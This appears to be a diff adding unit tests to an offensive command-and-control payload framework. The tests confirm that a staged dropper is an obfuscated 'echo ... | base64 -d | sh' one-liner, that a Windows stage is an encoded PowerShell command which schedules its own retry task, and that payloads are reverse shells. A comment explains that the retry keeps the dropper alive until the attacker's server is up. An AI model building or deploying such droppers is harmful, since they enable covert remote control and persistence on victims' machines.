@@ -91,6 +91,21 @@ class TestStage(unittest.TestCase):
         m = p.marker()
         self.assertTrue(m.startswith("PAYLOAD:reverse:linux:"))
 
+    def test_the_stage_dropper_is_resilient(self):
+        # a hand-delivered one-liner has to survive the C2 not being up yet:
+        # it retries on its own instead of being a single shot
+        p = PayloadEngine().stage("linux", "10.0.0.1", 8080)
+        self.assertTrue(p.command.startswith("echo "), p.command[:40])
+        self.assertTrue(p.command.endswith("| base64 -d | sh"))
+
+    def test_the_windows_stage_schedules_its_own_retry(self):
+        import base64
+        from phantom.utils.builder import _RETRY_TASK_WIN
+        p = PayloadEngine().stage("windows", "10.0.0.1", 8443)
+        inner = base64.b64decode(
+            p.command.rsplit("-Enc ", 1)[1]).decode("utf-16-le")
+        self.assertIn(_RETRY_TASK_WIN, inner)
+
 
 class TestPayloadCapability(unittest.TestCase):
     def test_capabilities_registered(self):
